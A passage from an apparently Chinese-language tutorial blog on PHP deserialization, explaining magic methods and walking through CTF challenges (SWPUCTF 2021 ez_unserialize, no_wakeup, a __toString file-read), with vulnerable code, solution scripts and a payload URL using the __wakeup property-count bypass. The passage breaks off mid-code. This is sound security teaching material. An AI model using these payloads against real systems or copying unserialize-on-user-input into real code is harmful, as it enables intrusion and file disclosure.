的函数。如果这样，该函数将在任何序列化之前运行。它可以清除对象并应该返回一个包含有该对象中应被序列化的所有变量名的数组。</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">使用 __sleep 的目的是关闭对象可能具有的任何数据库连接，提交等待中的数据或进行类似的清除任务。此外，如果有非常大的对象而并不需要完全储存下来时此函数也很有用。</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">相反地，unserialize() 检查具有魔术名称 __wakeup 的函数的存在。如果存在，此函数可以重建对象可能具有的任何资源。使用 __wakeup 的目的是重建在序列化中可能丢失的任何数据库连接以及处理其它重新初始化的任务。</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">9、__set_state</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">当调用var_export()时，这个静态 方法会被调用（自PHP 5.1.0起有效）。本方法的唯一参数是一个数组，其中包含按array(’property’ =&gt; value, …)格式排列的类属性。</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">10、__invoke</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">当尝试以调用函数的方式调用一个对象时，__invoke 方法会被自动调用。PHP5.3.0以上版本有效</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">11、__callStatic</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">它的工作方式类似于 __call() 魔术方法，__callStatic() 是为了处理静态方法调用，PHP5.3.0以上版本有效，PHP 确实加强了对 __callStatic() 方法的定义；它必须是公共的，并且必须被声明为静态的。</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">同样，__call() 魔术方法必须被定义为公共的，所有其他魔术方法都必须如此。</span></span></code></pre></div></div></figure><p>案例</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">&lt;?php</span></span><span class="line"><span style="color: #569CD6">class</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">ABC</span><span style="color: #D4D4D4">{</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$test</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">__construct</span><span style="color: #D4D4D4">(){</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">$test</span><span style="color: #D4D4D4"> =</span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #DCDCAA">echo</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">'调用了构造函数&lt;br&gt;'</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">__destruct</span><span style="color: #D4D4D4">(){</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #DCDCAA">echo</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">'调用了析构函数&lt;br&gt;'</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">__wakeup</span><span style="color: #D4D4D4">(){</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #DCDCAA">echo</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">'调用了苏醒函数&lt;br&gt;'</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #DCDCAA">echo</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">'创建对象a&lt;br&gt;'</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #9CDCFE">$a</span><span style="color: #D4D4D4">=</span><span style="color: #569CD6">new</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">ABC</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #DCDCAA">echo</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">'序列化&lt;br&gt;'</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #9CDCFE">$a_ser</span><span style="color: #D4D4D4">=</span><span style="color: #DCDCAA">serialize</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$a</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #DCDCAA">echo</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">'反序列化&lt;br&gt;'</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #9CDCFE">$a_unser</span><span style="color: #D4D4D4">=</span><span style="color: #DCDCAA">unserialize</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$a_ser</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #DCDCAA">echo</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">'对象快要死了！'</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">     </span></span><span class="line"><span style="color: #D4D4D4">?&gt;</span></span></code></pre></div></div></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507221446663.png" alt="image-20221009162607187"></p><p>要记忆的东西很多，记不住的话建议向上面那样开三个窗口对着看，或者多屏</p><h3 id="swpuctf-2021-新生赛ez_unserialize"><a class="markdownIt-Anchor" href="#swpuctf-2021-新生赛ez_unserialize"></a> [SWPUCTF 2021 新生赛] ez_unserialize</h3><p>普通反序列化</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">&lt;?php</span></span><span class="line"></span><span class="line"><span style="color: #DCDCAA">error_reporting</span><span style="color: #D4D4D4">(</span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #DCDCAA">show_source</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"cl45s.php"</span><span style="color: #D4D4D4">);</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">class</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">wllm</span><span style="color: #D4D4D4">{</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$admin</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$passwd</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">__construct</span><span style="color: #D4D4D4">(){</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">admin</span><span style="color: #D4D4D4"> =</span><span style="color: #CE9178">"user"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">passwd</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">"123456"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">__destruct</span><span style="color: #D4D4D4">(){</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">admin</span><span style="color: #D4D4D4"> === </span><span style="color: #CE9178">"admin"</span><span style="color: #D4D4D4"> &amp;&amp; </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">passwd</span><span style="color: #D4D4D4"> === </span><span style="color: #CE9178">"ctf"</span><span style="color: #D4D4D4">){</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #C586C0">include</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"flag.php"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #DCDCAA">echo</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$flag</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        }</span><span style="color: #C586C0">else</span><span style="color: #D4D4D4">{</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #DCDCAA">echo</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">admin</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #DCDCAA">echo</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">passwd</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #DCDCAA">echo</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"Just a bit more!"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        }</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #9CDCFE">$p</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">$_GET</span><span style="color: #D4D4D4">[</span><span style="color: #CE9178">'p'</span><span style="color: #D4D4D4">];</span></span><span class="line"><span style="color: #DCDCAA">unserialize</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$p</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">?&gt;</span></span></code></pre></div></div></figure><p>解题</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">&lt;?php</span></span><span class="line"><span style="color: #569CD6">class</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">wllm</span><span style="color: #D4D4D4">{</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$admin</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$passwd</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">__construct</span><span style="color: #D4D4D4">(){</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">admin</span><span style="color: #D4D4D4"> =</span><span style="color: #CE9178">"admin"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">passwd</span><span style="color: #D4D4D4"> =</span><span style="color: #CE9178">"ctf"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #9CDCFE">$b</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">new</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">wllm</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #DCDCAA">echo</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">serialize</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$b</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">?&gt;</span></span></code></pre></div></div></figure><h3 id="swpuctf-2021-新生赛no_wakeup"><a class="markdownIt-Anchor" href="#swpuctf-2021-新生赛no_wakeup"></a> [SWPUCTF 2021 新生赛] no_wakeup</h3><p>绕过 wakeup 魔术方法</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4"> &lt;?php</span></span><span class="line"></span><span class="line"><span style="color: #DCDCAA">header</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"Content-type:text/html;charset=utf-8"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #DCDCAA">error_reporting</span><span style="color: #D4D4D4">(</span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #DCDCAA">show_source</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"class.php"</span><span style="color: #D4D4D4">);</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">class</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">HaHaHa</span><span style="color: #D4D4D4">{</span></span><span class="line"></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$admin</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$passwd</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">__construct</span><span style="color: #D4D4D4">(){</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">admin</span><span style="color: #D4D4D4"> =</span><span style="color: #CE9178">"user"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">passwd</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">"123456"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        }</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">__wakeup</span><span style="color: #D4D4D4">(){</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">passwd</span><span style="color: #D4D4D4"> = </span><span style="color: #DCDCAA">sha1</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">passwd</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">        }</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">__destruct</span><span style="color: #D4D4D4">(){</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">admin</span><span style="color: #D4D4D4"> === </span><span style="color: #CE9178">"admin"</span><span style="color: #D4D4D4"> &amp;&amp; </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">passwd</span><span style="color: #D4D4D4"> === </span><span style="color: #CE9178">"wllm"</span><span style="color: #D4D4D4">){</span></span><span class="line"><span style="color: #D4D4D4">                </span><span style="color: #C586C0">include</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"flag.php"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">                </span><span style="color: #DCDCAA">echo</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$flag</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">            }</span><span style="color: #C586C0">else</span><span style="color: #D4D4D4">{</span></span><span class="line"><span style="color: #D4D4D4">                </span><span style="color: #DCDCAA">echo</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">passwd</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">                </span><span style="color: #DCDCAA">echo</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"No wake up"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">            }</span></span><span class="line"><span style="color: #D4D4D4">        }</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"></span><span class="line"><span style="color: #9CDCFE">$Letmeseesee</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">$_GET</span><span style="color: #D4D4D4">[</span><span style="color: #CE9178">'p'</span><span style="color: #D4D4D4">];</span></span><span class="line"><span style="color: #DCDCAA">unserialize</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$Letmeseesee</span><span style="color: #D4D4D4">);</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">?&gt;</span></span></code></pre></div></div></figure><p>考点：__wakeup () 函数的绕过：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过 wakeup 的执行。因此，需要修改序列化字符串中的属性个数。</p><p>漏洞影响<em>的版本</em>： <em>PHP</em>5 &lt; 5.6.25 <em>PHP</em>7 &lt; 7.0.10</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">&lt;?php</span></span><span class="line"></span><span class="line"><span style="color: #569CD6">class</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">HaHaHa</span><span style="color: #D4D4D4">{</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$admin</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$passwd</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">__construct</span><span style="color: #D4D4D4">(){</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">admin</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">"admin"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">passwd</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">"wllm"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        }</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4"> </span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #9CDCFE">$b</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">new</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">HaHaHa</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #DCDCAA">echo</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">serialize</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">$b</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">?&gt;</span></span></code></pre></div></div></figure><p>输出如下：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">O:</span><span style="color: #B5CEA8">6</span><span style="color: #D4D4D4">:</span><span style="color: #CE9178">"HaHaHa"</span><span style="color: #D4D4D4">:</span><span style="color: #B5CEA8">2</span><span style="color: #D4D4D4">:{s:</span><span style="color: #B5CEA8">5</span><span style="color: #D4D4D4">:</span><span style="color: #CE9178">"admin"</span><span style="color: #D4D4D4">;s:</span><span style="color: #B5CEA8">5</span><span style="color: #D4D4D4">:</span><span style="color: #CE9178">"admin"</span><span style="color: #D4D4D4">;s:</span><span style="color: #B5CEA8">6</span><span style="color: #D4D4D4">:</span><span style="color: #CE9178">"passwd"</span><span style="color: #D4D4D4">;s:</span><span style="color: #B5CEA8">4</span><span style="color: #D4D4D4">:</span><span style="color: #CE9178">"wllm"</span><span style="color: #D4D4D4">;}</span></span><span class="line"><span style="color: #D4D4D4">payload：http:</span><span style="color: #6A9955">//1.14.71.254:28886/class.php?p=O:6:%22HaHaHa%22:3:{s:5:%22admin%22;s:5:%22admin%22;s:6:%22passwd%22;s:4:%22wllm%22;}</span></span></code></pre></div></div></figure><h3 id="执行__tostring魔术方法"><a class="markdownIt-Anchor" href="#执行__tostring魔术方法"></a> 执行__toString () 魔术方法</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">&lt;?php  </span></span><span class="line"></span><span class="line"><span style="color: #569CD6">class</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">Flag</span><span style="color: #D4D4D4">{  </span><span style="color: #6A9955">//flag.php  </span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$file</span><span style="color: #D4D4D4">;  </span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">__tostring</span><span style="color: #D4D4D4">(){  </span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4">(</span><span style="color: #DCDCAA">isset</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">file</span><span style="color: #D4D4D4">)){  </span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #DCDCAA">echo</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">file_get_contents</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">file</span><span style="color: #D4D4D4">); </span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #DCDCAA">echo</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"&lt;br&gt;"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> (</span><span style="color: #CE9178">"U R SO CLOSE !///COME ON PLZ"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">        }  </span></span><span class="line"><span style="color: #D4D4D4">    }  </span></span><span class="line"><span style="color: #D4D4D4">}  </span></span><span class="line"><span style="color: #D4D4D4">?&gt;</span></span></code></pre></div></div></figure><p>本地进行序列化</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">&lt;?php</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">class</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">Flag</span><span style="color: #D4D4D4">{  </span><span style="color: #6A9955">//flag.php  </span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">$file</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"flag.php"</span><span style="color: #D4D4D4">;  </span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">function</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">__tostring</span><span style="color: #D4D4D4">(){  </span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4">(</span><span style="color: #DCDCAA">isset</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">file</span><span style="color: #D4D4D4">)){  </span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #DCDCAA">echo</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">file_get_contents</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">$this</span><span style="color: #D4D4D4">-&gt;</span><span style="color: #9CDCFE">file</span><span style="color: #D4D4D4">); </span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #DCDCAA">echo</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"&lt;br&gt;"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> (</span><span style="color: #CE9178">"U R SO CLOSE !///COME ON PLZ"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">        }  </span></span><span class="line"><span style="color: #D4D4D4">    }  </span></span><span class="line"><span style="color: #D4D4D4">}  </span></span><span class="line"><span style="color: #9CDCFE">$a</span><span style="color: #D4D4D4">=</span><span style="color: #569CD6">new</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">Flag</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #DCDCAA">echo</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">serialize</span><span style="color: 